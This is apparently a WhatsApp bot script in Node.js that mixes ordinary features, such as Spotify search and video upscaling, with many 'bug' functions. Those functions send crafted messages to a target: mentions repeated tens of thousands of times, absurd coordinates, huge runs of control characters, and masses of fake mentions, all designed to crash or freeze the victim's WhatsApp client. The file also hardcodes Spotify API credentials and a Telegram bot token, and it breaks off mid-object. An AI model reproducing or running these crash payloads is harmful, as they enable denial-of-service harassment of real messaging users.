//base by LOST BOY X LORD TECH
//WhatsApp: https://whatsapp.com/channel/0029Vani1Mn5fM5WnZHzrK0T
//want more free bot scripts? subscribe to my youtube channel: 

const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))

const NodeCache = require('node-cache');

//bug database
const { teksbug1 } = require("./Noname/virtex.js")
const { teksbug2 } = require("./Noname/delay.js")
const { beta1, beta2, buk1 } = require("./lib/hdr.js")
//bug beta by badboi
const { ngazap } = require('./virus/ngazap')
const { crash } = require('./virus/crash')
const { buttonkal } = require('./virus/buttonkal')
const { cttl } = require('./virus/cttl')
const { tizi } = require('./virus/tizi')
const { weg } = require('./virus/weg')
const { virus7 } = require('./virus/virus7')
const { notif3 } = require("./virus/notif3")
const { notif4 } = require("./virus/notif4")

//bug sound import by badboi 
const darkphonk = fs.readFileSync('./dmedia/menu.mp3')
const bug = fs.readFileSync(`./dmedia/11.mp3`)
let premium = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
let owner = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./dtbs/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./dtbs/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/sticker.json'))
const Imagedare = JSON.parse(fs.readFileSync('./dtbs/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./dtbs/autoreply/apk.json'))

//time
const xtime = moment.tz('Ghana/Accra').format('HH:mm:ss')
        const xdate = moment.tz('Ghana/Accra').format('DD/MM/YYYY')
        const time2 = moment().tz('Ghana/Accra').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var daretimewisher = `Good Night 𝘽𝙔 KELVIN-V2 🏆`
 }
 if(time2 < "19:00:00"){
var daretimewisher = `Good Evening 𝘽𝙔 KELVIN-V2  😁`
 }
 if(time2 < "18:00:00"){
var daretimewisher = `Good Evening 𝘽𝙔 KELVIN-V2 😎`
 }
 if(time2 < "15:00:00"){
var daretimewisher = `Good Afternoon 𝘽𝙔 KELVIN-V2 🥇`
 }
 if(time2 < "11:00:00"){
var daretimewisher = `Good Morning 𝘽𝙔 KELVIN-V2 🎶`
 }
 if(time2 < "05:00:00"){
var daretimewisher = `Good Morning 𝘽𝙔 KELVIN-V2 🌄`
 } 
module.exports = dare = async (dare, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplydare.selectedRowId : (m.mtype == 'templateButtonreplydareMessage') ? m.message.templateButtonreplydareMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplydare.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await dare.decodeJid(dare.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await dare.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = dare.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? dare.user.id.split(':')[0] + "@s.whatsapp.net" || dare.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(dare, m, premium);
        const sendvn = (teks) => {
dare.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};

async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
async function dareHDvideo() {
  try {
    const inputVideo = await dare.downloadAndSaveMediaMessage(quoted);
    const outputVideo = 'output_2k.mp4';
    await new Promise((resolve, reject) => {
      ffmpeg(inputVideo)
        .outputOptions('-vf', 'scale=2560:1440')
        .on('start', commandLine => {
          console.log('Start the process with the command:', commandLine);
        })
        .on('progress', progress => {
          console.log('Proses sedang berjalan:', progress.percent.toFixed(2) + '% selesai');
        })
        .on('end', () => {
          console.log('Proses selesai!');
          resolve();
        })
        .on('error', (err, stdout, stderr) => {
          console.error('There is an error:', err.message);
          console.error('stdout:', stdout);
          console.error('stderr:', stderr);
          reject(err);
        })
        .save(outputVideo);
    });
    const caption = 'Successfully made the video HD';
    await dare.sendMessage(m.chat, { caption: caption, video: { url: path.resolve(outputVideo) } }, { quoted: m });

  } catch (error) {
   reply('There is an error:', error);
  }
}
async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//group chat msg by xeon
const replydare = (teks) => {
dare.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./dmedia/menu3.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replydare('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'KELVIN-V2 𝘽𝙔 KELVIN',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

//bug functions

let ppuser
try {
ppuser = await dare.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐏𝐫𝐞𝐥𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}

     async function caroLoc(target, pic, Ptcp = true ) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "-999999999999999999999999999",
            degreesLongitude: "-999999999999999999999999999",
            caption: "‌TRY 💔‌" + "@null".repeat(13000),
            sequenceNumber: "0",
            jpegThumbnail: pic
          }
        },
         carouselMessage: "{}"
      }
    }), {
      userJid: target,
      quoted: EsQl
    });
    await dare.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
}
  //=======================
 async function Sinvi(target, Ptcp = true) {
     const userMention = {

        "type": "user",

        "userJid": target,

        "mention": "@" + target.split('@')[0], // This assumes the display name is the part before '@'

    };
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "🌑samMIC💀",
        locationMessage: {},
        hasMediaAttachment: true
       },
       body: {
        text: "🌑samMIC💀\n" + userMention.mention.repeat(17000),
       },
       nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: " Spider〽️ "
       },
       carouselMessage: {}
      }
     }
    }
   }), {
    userJid: target,
    quoted: EsQl 
   });

   await dare.relayMessage(target, etc.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.green("Send Bug By Spider V9〽️"));
  };   
  async function freezegc(target) {		
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " dare" }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await dare.relayMessage(target, etc.message, {});
		}
const extd = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "dare🏴‍☠️"
}
}
};
async function freezekamoflase(target) {

    await dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 414058.5,
                            degreesLongitude: 131518.0 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `dare🏴‍☠️ ${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐑𝐞𝐚𝐥🦣" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function caltx(target) {
			let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								hasMediaAttachment: true,
								text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								title: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								contextInfo: { mentionedJid: [ "0@s.whatsapp.net" ] }
								},
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "dare" }]
							}
						}
					},
				}), {
					userJid: target
				}
			);
			await dare.relayMessage(target, etc.message, {});
		}
		
async function freezeuii(target) {

    await dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " dare" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function freezeui(target) {

    await dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        viewOnceMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0 
                        },
                        hasMediaAttachment: false
                    },
                    body: {
                        text: `dare ${"@254742491666 ".repeat(10000)}`,
           "contextInfo": { mentionedJid: [ "254742491666@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "254742491666@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐃𝐘𝐍𝐀𝐌𝐎 🦄 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function NewsletterZap(target) {
			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
				   'key': {
                    'remoteJid': 'status@broadcast',
                     'fromMe': false,
                      'participant': '0@s.whatsapp.net'
                },
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": `${buttonkal}`,
							"jpegThumbnail": "",
							"caption": `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await dare.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': null
			});
		}
async function newfreezebug(target) {
    let virus = "𝐃𝐘𝐍𝐀𝐌𝐎 🦄 🔐";

    await dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 7777099.1,
                            degreesLongitude: -922.999999999999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐃𝐘𝐍𝐀𝐌𝐎 🦄" + "@sammicv2".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐃𝐘𝐍𝐀𝐌𝐎 🦄 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function newvirpen(target) {
    let virus = "𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@null"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "𝐃𝐘𝐍𝐀𝐌𝐈𝐂 🦄"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virus 
                        }]
                    }
                }
            }
        }
    };

    await dare.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}
async function TxIos(target, Ptcp = false) {
			await dare.relayMessage(target, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ 𝐃𝐘𝐍𝐀𝐌𝐈𝐂⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "62895364760801@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "62895364760801@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAsamBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vsamkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "62895364760801@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "A̺͆N̺͆T̺͆I̺͆ G̺͆E̺͆D̺͆O̺͆R̺͆〽",
								"body": "尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
